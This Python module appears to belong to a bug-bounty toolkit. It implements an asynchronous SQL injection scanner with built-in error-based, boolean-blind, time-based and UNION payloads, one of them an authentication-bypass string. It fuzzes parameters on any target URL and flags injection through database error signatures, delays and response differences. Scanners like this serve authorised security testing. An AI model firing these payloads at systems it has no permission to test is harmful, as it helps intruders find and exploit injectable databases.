"""SQLi Scanner - tests parameters for SQL Injection vulnerabilities."""

import asyncio
import json
import re
import time
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from pathlib import Path

import click
from colorama import Fore, Style

from core.config import Config
from core.http_client import AsyncHTTPClient


class SQLiScanner:
    """Scanner for SQL Injection vulnerabilities."""

    # Database error signatures
    DB_ERRORS = {
        "mysql": [
            r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.", r"com\.mysql\.jdbc",
        ],
        "postgresql": [
            r"PostgreSQL.*?ERROR", r"Warning.*?\Wpg_", r"valid PostgreSQL result",
            r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
        ],
        "mssql": [
            r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
            r"(\W|\A)SQL Server.*?Driver", r"Warning.*?mssql_",
            r"(\W|\A)SQL Server.*?[0-9a-fA-F]{8}", r"System\.Data\.SqlClient\.SqlException",
        ],
        "oracle": [
            r"\bORA-\d{5}", r"Oracle error", r"Oracle.*?Driver",
            r"Warning.*?\Woci_", r"Warning.*?\Wora_",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?sqlite_", r"Warning.*?SQLite3::",
            r"\[SQLITE_ERROR\]",
        ],
    }

    def __init__(self, target: str, config: Config, proxy: Optional[str] = None,
                 threads: int = 10, technique: str = "all"):
        self.target = target
        self.config = config
        self.proxy = proxy
        self.threads = threads
        self.technique = technique  # all, error, blind, time, union
        self.results: List[Dict[str, Any]] = []
        self.logger = logging.getLogger("bugrecon.tools.sqli")

        if proxy:
            self.config._data.setdefault("proxy", {})["enabled"] = True
            self.config._data["proxy"]["http_proxy"] = proxy

    def get_payloads(self, wordlist: Optional[str] = None) -> List[Dict[str, str]]:
        """Get SQLi test payloads."""
        payloads = []

        # Error-based
        if self.technique in ("all", "error"):
            payloads.extend([
                {"value": "'", "type": "error-probe", "technique": "error"},
                {"value": "\"", "type": "error-probe", "technique": "error"},
                {"value": "'--", "type": "error-comment", "technique": "error"},
                {"value": "' AND '1'='1", "type": "error-true", "technique": "error"},
                {"value": "' AND '1'='2", "type": "error-false", "technique": "error"},
                {"value": "1' AND extractvalue(1,concat(0x7e,version()))--", "type": "error-extract", "technique": "error"},
                {"value": "1' AND updatexml(1,concat(0x7e,version()),1)--", "type": "error-updatexml", "technique": "error"},
                {"value": "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", "type": "error-floor", "technique": "error"},
            ])

        # Boolean blind
        if self.technique in ("all", "blind"):
            payloads.extend([
                {"value": "' OR '1'='1", "type": "bool-true", "technique": "blind"},
                {"value": "' OR '1'='2", "type": "bool-false", "technique": "blind"},
                {"value": "1 OR 1=1", "type": "bool-num-true", "technique": "blind"},
                {"value": "1 OR 1=2", "type": "bool-num-false", "technique": "blind"},
                {"value": "' OR 1=1#", "type": "bool-hash", "technique": "blind"},
                {"value": "' OR 1=1--", "type": "bool-comment", "technique": "blind"},
                {"value": "admin'--", "type": "auth-bypass", "technique": "blind"},
            ])

        # Time-based blind
        if self.technique in ("all", "time"):
            payloads.extend([
                {"value": "' AND SLEEP(5)--", "type": "time-mysql", "technique": "time"},
                {"value": "1; WAITFOR DELAY '0:0:5'--", "type": "time-mssql", "technique": "time"},
                {"value": "' AND pg_sleep(5)--", "type": "time-postgres", "technique": "time"},
                {"value": "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--", "type": "time-subquery", "technique": "time"},
            ])

        # UNION-based
        if self.technique in ("all", "union"):
            payloads.extend([
                {"value": "' UNION SELECT NULL--", "type": "union-1col", "technique": "union"},
                {"value": "' UNION SELECT NULL,NULL--", "type": "union-2col", "technique": "union"},
                {"value": "' UNION SELECT NULL,NULL,NULL--", "type": "union-3col", "technique": "union"},
                {"value": "1 ORDER BY 1--", "type": "orderby-1", "technique": "union"},
                {"value": "1 ORDER BY 10--", "type": "orderby-10", "technique": "union"},
                {"value": "1 ORDER BY 50--", "type": "orderby-50", "technique": "union"},
            ])

        if wordlist and Path(wordlist).exists():
            with open(wordlist) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append({"value": line, "type": "custom", "technique": "unknown"})

        return payloads

    async def scan(self, wordlist: Optional[str] = None) -> List[Dict[str, Any]]:
        """Run SQLi scan against target."""
        payloads = self.get_payloads(wordlist)
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            sqli_params = ["id", "user_id", "item_id", "cat", "category", "page",
                          "sort", "order", "search", "q", "query", "filter",
                          "report", "dir", "limit", "offset"]
            params = {p: ["1"] for p in sqli_params}

        self.logger.info(f"Testing {len(params)} parameters with {len(payloads)} payloads")

        async with AsyncHTTPClient(self.config) as client:
            baseline = await self._get_baseline(client)
            semaphore = asyncio.Semaphore(self.threads)
            tasks = []

            for param_name in params:
                for payload in payloads:
                    tasks.append(
                        self._test_payload(client, semaphore, param_name, payload, baseline)
                    )

            await asyncio.gather(*tasks)

        return self.results

    async def _get_baseline(self, client: AsyncHTTPClient) -> Dict[str, Any]:
        """Get baseline response."""
        try:
            resp = await client.get(self.target)
            return {"status": resp.status, "length": len(resp.text), "time": resp.elapsed, "body": resp.text}
        except Exception:
            return {"status": 0, "length": 0, "time": 0, "body": ""}

    async def _test_payload(self, client: AsyncHTTPClient, semaphore: asyncio.Semaphore,
                           param: str, payload: Dict[str, str], baseline: Dict[str, Any]):
        """Test a single SQLi payload."""
        async with semaphore:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            original_value = params.get(param, ["1"])[0]
            params[param] = [original_value + payload["value"] if payload["technique"] != "union" else payload["value"]]

            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                start = time.time()
                resp = await client.get(test_url, timeout=15)
                elapsed = time.time() - start

                finding = self._analyze_response(resp, payload, param, baseline, elapsed)
                if finding:
                    self.results.append(finding)
                    self._print_finding(finding)

            except Exception as e:
                self.logger.debug(f"Error testing {param}: {e}")

    def _analyze_response(self, resp, payload: Dict, param: str,
                         baseline: Dict, elapsed: float) -> Optional[Dict[str, Any]]:
        """Analyze response for SQLi indicators."""
        indicators = []
        confidence = "low"
        db_type = "unknown"

        # Error-based detection
        for db, patterns in self.DB_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, resp.text, re.I):
                    indicators.append(f"Database error ({db}): {pattern}")
                    confidence = "high"
                    db_type = db
                    break

        # Time-based detection
        if payload["technique"] == "time" and elapsed >= 4.5:
            indicators.append(f"Time delay detected: {elapsed:.2f}s (expected ~5s)")
            confidence = "high"

        # Boolean-based detection
        if payload["technique"] == "blind":
            length_diff = abs(len(resp.text) - baseline.get("length", 0))
            if "true" in payload["type"] and length_diff < 50 and resp.status == baseline.get("status"):
                pass  # True condition matches baseline - good sign
            elif "false" in payload["type"] and length_diff > 100:
                indicators.append(f"Boolean difference detected: {length_diff} chars")
                confidence = "medium"

        # UNION detection
        if payload["technique"] == "union":
            if resp.status == 200 and "ORDER BY" in payload["value"]:
                if resp.status != baseline.get("status") or abs(len(resp.text) - baseline.get("length", 0)) > 50:
                    indicators.append("ORDER BY column count change detected")
                    confidence = "medium"

        # Generic SQL error patterns
        generic_errors = [
            r'You have an error in your SQL syntax',
            r'Unclosed quotation mark',
            r'quoted string not properly terminated',
            r'syntax error at or near',
        ]
        for pattern in generic_errors:
            if re.search(pattern, resp.text, re.I):
                indicators.append(f"SQL syntax error: {pattern}")
                if confidence == "low":
                    confidence = "high"

        if indicators:
            return {
                "type": "SQLi",
                "parameter": param,
                "payload": payload["value"],
                "payload_type": payload["type"],
                "technique": payload["technique"],
                "confidence": confidence,
                "database": db_type,
                "indicators": indicators,
                "response_status": resp.status,
                "elapsed": elapsed,
            }
        return None

    def _print_finding(self, finding: Dict[str, Any]):
        """Print a finding."""
        color = Fore.RED if finding["confidence"] == "high" else Fore.YELLOW
        print(f"\n{color}[SQLi] [{finding['confidence'].upper()}] ({finding['technique']}){Style.RESET_ALL}")
        print(f"  Parameter: {finding['parameter']}")
        print(f"  Payload: {finding['payload']}")
        if finding["database"] != "unknown":
            print(f"  Database: {finding['database']}")
        for ind in finding["indicators"]:
            print(f"  {Fore.CYAN}→ {ind}{Style.RESET_ALL}")


@click.command()
@click.option('--target', '-t', required=True, help='Target URL')
@click.option('--proxy', '-p', help='Proxy URL')
@click.option('--threads', default=10, help='Concurrent threads')
@click.option('--technique', default='all', type=click.Choice(['all', 'error', 'blind', 'time', 'union']))
@click.option('--wordlist', '-w', help='Custom payload wordlist')
@click.option('--output', '-o', default='sqli_results.json', help='Output file')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
def scan(target, proxy, threads, technique, wordlist, output, verbose):
    """SQLi Scanner - Test for SQL Injection."""
    from core.utils import print_banner, setup_logging

    print_banner()
    print(f"{Fore.CYAN}[*] SQLi Scanner{Style.RESET_ALL}")
    print(f"[*] Target: {target}")
    print(f"[*] Technique: {technique}")
    print()

    setup_logging("DEBUG" if verbose else "INFO")
    config = Config()

    scanner = SQLiScanner(target, config, proxy=proxy, threads=threads, technique=technique)
    results = asyncio.run(scanner.scan(wordlist))

    print(f"\n{'='*60}")
    print(f"{Fore.GREEN}[*] Scan Complete - {len(results)} findings{Style.RESET_ALL}")

    with open(output, 'w') as f:
        json.dump({"target": target, "findings": results}, f, indent=2)
    print(f"[*] Results saved to: {output}")


if __name__ == '__main__':
    scan()
